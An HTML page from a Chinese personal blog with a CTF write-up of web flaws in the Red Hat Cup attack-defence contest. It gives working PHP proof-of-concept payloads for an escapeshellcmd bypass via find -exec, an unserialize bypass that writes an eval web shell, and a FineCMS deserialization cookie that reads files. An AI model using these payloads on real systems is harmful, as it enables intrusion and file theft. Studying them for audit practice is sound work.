@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="红帽杯线下赛上周打了一场红帽杯的线下赛,可惜开具发挥失误服务器down了几轮一度垫底…最后才又勉强上了点儿分…..赛后对题目中的几处比较有意义的漏洞做了一下分析,写出了下面篇文章. 红帽杯线下赛web原题已同步到我社github上:https://github.com/susers/Writeups web1web1是一个wordpress的应用程序,可惜当时比赛刚开始时服务器上的权限设置并不能直">
+<meta name="keywords" content="Ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红帽杯线下赛AWD题目分析">
+<meta property="og:url" content="https://hexo.imagemlt.xyz/post/红帽杯线下赛AWD题目分析/index.html">
+<meta property="og:site_name" content="Image&#39;s blog">
+<meta property="og:description" content="红帽杯线下赛上周打了一场红帽杯的线下赛,可惜开具发挥失误服务器down了几轮一度垫底…最后才又勉强上了点儿分…..赛后对题目中的几处比较有意义的漏洞做了一下分析,写出了下面篇文章. 红帽杯线下赛web原题已同步到我社github上:https://github.com/susers/Writeups web1web1是一个wordpress的应用程序,可惜当时比赛刚开始时服务器上的权限设置并不能直">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://p7lc13qga.bkt.clouddn.com/escapeshellcmd.png">
+<meta property="og:image" content="http://p7lc13qga.bkt.clouddn.com/find1.png">
+<meta property="og:image" content="http://p7lc13qga.bkt.clouddn.com/find2.png">
+<meta property="og:image" content="http://p7lc13qga.bkt.clouddn.com/find3.png">
+<meta property="og:updated_time" content="2018-06-04T06:44:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="红帽杯线下赛AWD题目分析">
+<meta name="twitter:description" content="红帽杯线下赛上周打了一场红帽杯的线下赛,可惜开具发挥失误服务器down了几轮一度垫底…最后才又勉强上了点儿分…..赛后对题目中的几处比较有意义的漏洞做了一下分析,写出了下面篇文章. 红帽杯线下赛web原题已同步到我社github上:https://github.com/susers/Writeups web1web1是一个wordpress的应用程序,可惜当时比赛刚开始时服务器上的权限设置并不能直">
+<meta name="twitter:image" content="http://p7lc13qga.bkt.clouddn.com/escapeshellcmd.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://hexo.imagemlt.xyz/post/红帽杯线下赛AWD题目分析/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>红帽杯线下赛AWD题目分析 | Image's blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+	<a href="https://github.com/imagemlt"><img style="position: absolute; top: 0; right: 0; border: 0;z-index:1" src="https://s3.amazonaws.com/github/ribbons/forkme_right_orange_ff7600.png" alt="Fork me on GitHub"></a>
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Image's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <h1 class="site-subtitle" itemprop="description">Welcome to Image's Blog</h1>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-links">
+    <a href="/links/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-link"></i> <br>Links</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/红帽杯线下赛AWD题目分析/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">红帽杯线下赛AWD题目分析
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-06-03 15:37:47" itemprop="dateCreated datePublished" datetime="2018-06-03T15:37:47+08:00">2018-06-03</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-06-04 14:44:06" itemprop="dateModified" datetime="2018-06-04T14:44:06+08:00">2018-06-04</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="红帽杯线下赛"><a href="#红帽杯线下赛" class="headerlink" title="红帽杯线下赛"></a>红帽杯线下赛</h2><p>上周打了一场红帽杯的线下赛,可惜开具发挥失误服务器down了几轮一度垫底…最后才又勉强上了点儿分…..赛后对题目中的几处比较有意义的漏洞做了一下分析,写出了下面篇文章.</p>
+<p>红帽杯线下赛web原题已同步到我社github上:<a href="https://github.com/susers/Writeups">https://github.com/susers/Writeups</a></p>
+<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>web1是一个wordpress的应用程序,可惜当时比赛刚开始时服务器上的权限设置并不能直接修复程序,所以就先去搞了web2.后来传了一个马上去才修复了一些权限的问题,其他的漏洞基本上是通过抓包来搞出来的….这里贴一些赛后看各路大佬writeup等感觉不错的漏洞点:</p>
+<h3 id="命令执行1-escapeshellcmd绕过"><a href="#命令执行1-escapeshellcmd绕过" class="headerlink" title="命令执行1 escapeshellcmd绕过"></a>命令执行1 escapeshellcmd绕过</h3><p>在/wp-login.php中:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'debug'</span>:</span><br><span class="line">        $file = addslashes($_POST[<span class="string">'file'</span>]);</span><br><span class="line">        system(<span class="string">"find /tmp -iname "</span>.escapeshellcmd($file));</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>先看一下escapeshellcmd的说明:</p>
+<p><img src="http://p7lc13qga.bkt.clouddn.com/escapeshellcmd.png" alt="escapeshellcmd"></p>
+<p>可以看到escapeshellcmd的主要功能是对可以截断shell命令的字符进行转义.</p>
+<p>然而这里的语句倍拼接到了find命令下,而find命令有一个参数是exec参数,可移执行命令,因此我们这里便可以利用find命令的exec参数来bypass.</p>
+<p>find exec参数执行的示例:</p>
+<p><img src="http://p7lc13qga.bkt.clouddn.com/find1.png" alt="find1"></p>
+<p>然而这里报缺少参数,是因为-exec传入的指令需要有结束符,分号必不可少,且分号应该加上反斜杠防止歧义.</p>
+<p><img src="http://p7lc13qga.bkt.clouddn.com/find2.png" alt="find2"></p>
+<p>这里看到命令被循环执行了,于是我们加上-quit只打印一次:</p>
+<p><img src="http://p7lc13qga.bkt.clouddn.com/find3.png" alt="find3"></p>
+<p>因此利用这样的指令便可以读文件.poc为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=xxx -or -exec cat /flag ; quit</span><br></pre></td></tr></table></figure>
+<p>这里不加反斜杠是因为escapeshellcmd会给我们的参数自动加上反斜杠.</p>
+<h3 id="命令执行2"><a href="#命令执行2" class="headerlink" title="命令执行2"></a>命令执行2</h3><p>在wp-includes/class-wp-cachefile.php中:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'/tmp/cachefile'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;div&gt;Welcome back %s&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data = null)</span> </span>&#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;loadData($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;render($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span></span><br><span class="line">        &amp;&amp; !preg_match(<span class="string">'/O:\d:\/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span><span class="params">($file = null, $tpl = null)</span> </span>&#123;</span><br><span class="line">        $file = $file ?? <span class="keyword">$this</span>-&gt;cacheFile;</span><br><span class="line">        $tpl = $tpl ?? <span class="keyword">$this</span>-&gt;template;</span><br><span class="line">        file_put_contents($file, $tpl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> sprintf(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template,</span><br><span class="line">            htmlspecialchars($data[<span class="string">'name'</span>])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createCache();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Template($_COOKIE[<span class="string">'data'</span>]);</span><br></pre></td></tr></table></figure></p>
+<p>这里可以看到构造函数中调用了loadData来对传入的cookie值进行序列化,而loadData函数中对传入的参数进行了两个过滤:</p>
+<ul>
+<li><strong>substr($data,0,2)!==’O:’</strong><br>可以通过序列化一个数组,数组中的元素为类来绕过.</li>
+<li><strong>!preg_match(‘/O:\d:\/‘, $data)</strong><br>可以通过正号来绕过匹配.</li>
+</ul>
+<p>在template类中的析构函数中调用了createCache方法,createCache方法中可以任意写入文件.<br>因此构造payload的poc为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'./shell.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;?php eval($_REQUEST[test]);'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$t=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="keyword">new</span> Template());</span><br><span class="line">print_r(serialize($t));</span><br></pre></td></tr></table></figure>
+<p>最后得到的符合条件的payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;i:1;O:+8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:11:&quot;./shell.php&quot;;s:8:&quot;template&quot;;s:28:&quot;&lt;?php eval($_REQUEST[test]);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>求他的洞就大概都是一些主办方预留的shell之类的了…..</p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>web2是一个finecms,当时防护做得比较好所以没有出现太多的问题.</p>
+<h3 id="命令执行1-finecms-dayrui-config-config-class-php"><a href="#命令执行1-finecms-dayrui-config-config-class-php" class="headerlink" title="命令执行1 /finecms/dayrui/config/config.class.php"></a>命令执行1 /finecms/dayrui/config/config.class.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$config = unserialize(base64_decode($config));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'param'</span>]))&#123;</span><br><span class="line">    $config-&gt;$_GET[<span class="string">'param'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FinecmsConfig</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $config;</span><br><span class="line">    <span class="keyword">private</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $filter;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config == <span class="string">""</span>)&#123;</span><br><span class="line">            $config = <span class="keyword">isset</span>($_POST[<span class="string">'Finecmsconfig'</span>])?$_POST[<span class="string">'Finecmsconfig'</span>]:<span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SetFilter</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filter)&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;filter <span class="keyword">as</span> $filter)&#123;</span><br><span class="line"></span><br><span class="line">                </span><br><span class="line">                $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;SetFilter($key);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里可以看到调用<code>$config-&gt;$_GET[param]</code>,如果<strong>$config</strong>是一个类且这个类不存在<strong>$_GET[param]</strong>这样一个属性就会调用__get()方法.</p>
+<p>可以看到这里的FinecmsConfig类正好存在一个<code>__get()</code>方法.而在<code>__get()</code>方法中调用了SetFilter方法.<br>在SetFilter方法中调用了call_user_func方法,因此这里存在命令执行漏洞.</p>
+<p>全局搜索引用了config.class.php文件的文件,可以找到在<br>./finecms/Init.php中存在引用,./finecms/Init.php中设置了<strong>$config</strong>变量:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'FINECMS_CONFIG'</span>]))&#123;</span><br><span class="line">    $config = $_COOKIE[<span class="string">'FINECMS_CONFIG'</span>];</span><br><span class="line">    <span class="keyword">require</span> FCPATH.<span class="string">'dayrui/config/config.class.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这里$config的值被设置为<code>$_COOKIE[&#39;FINECMS_CONFIG&#39;]</code>;</p>
+<p>因此我们可以得出最后的payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FinecmsConfig</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $config;</span><br><span class="line">    <span class="keyword">private</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $filter=<span class="keyword">array</span>(<span class="string">'readfile'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> FinecmsConfig();</span><br><span class="line">print_r(base64_encode(serialize($c)));</span><br></pre></td></tr></table></figure>
+<p>得到cookie FINECMS_CONFIG的值:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxMzoiRmluZWNtc0NvbmZpZyI6Mzp7czoyMToiAEZpbmVjbXNDb25maWcAY29uZmlnIjtOO3M6MTk6IgBGaW5lY21zQ29uZmlnAHBhdGgiO047czo2OiJmaWx0ZXIiO2E6MTp7aTowO3M6ODoicmVhZGZpbGUiO319</span><br></pre></td></tr></table></figure></p>
+<p>GET参数设置为/flag即可获取flag.</p>
+<h3 id="命令执行2-1"><a href="#命令执行2-1" class="headerlink" title="命令执行2"></a>命令执行2</h3><p>finecms的一个1day<br><a href="https://zhuanlan.zhihu.com/p/35133267">https://zhuanlan.zhihu.com/p/35133267</a><br><a href="http://lu4n.com/finecms-rce-0day/">http://lu4n.com/finecms-rce-0day/</a></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>梅子酒师傅之前挖到的一个sql注入的CVE:</p>
+<p><a href="https://xz.aliyun.com/t/2050">Finecms SQL注入漏洞 [CVE-2018-6893]</a></p>
+<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><p>其他就是类似web1一样的小马之类的了…..</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>开始打awd之后这次比赛又回到了第一次打awd的感觉….只能说还是太菜了…..<br>以后还是要多联系一下代码审计,真的佩服大佬们代码审计的能力.</p>
+<p>另外题目中的漏洞点将会单独抽出来作为代码审计题目放到<a href="http://sus.njnet6.edu.cn/">我校的CTF平台上</a>供师傅们分析练习.</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://skysec.top/2018/05/27/2018RedHat-AD-Web/">http://skysec.top/2018/05/27/2018RedHat-AD-Web/</a></li>
+<li><a href="https://xz.aliyun.com/t/2050">Finecms SQL注入漏洞 [CVE-2018-6893]</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/35133267">https://zhuanlan.zhihu.com/p/35133267</a>  </li>
+<li><a href="http://lu4n.com/finecms-rce-0day/">http://lu4n.com/finecms-rce-0day/</a></li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Ctf/" rel="tag"># Ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/post/wmj-2/index.html" rel="next" title="纸短情长">
+                <i class="fa fa-chevron-left"></i> 纸短情长
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/post/flask自定义decorator的坑点/index.html" rel="prev" title="flask自定义decorator的坑点">
+                flask自定义decorator的坑点 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4" alt="Imagemlt">
+            
+              <p class="site-author-name" itemprop="name">Imagemlt</p>
+              <p class="site-description motion-element" itemprop="description">personal blog</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">46</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
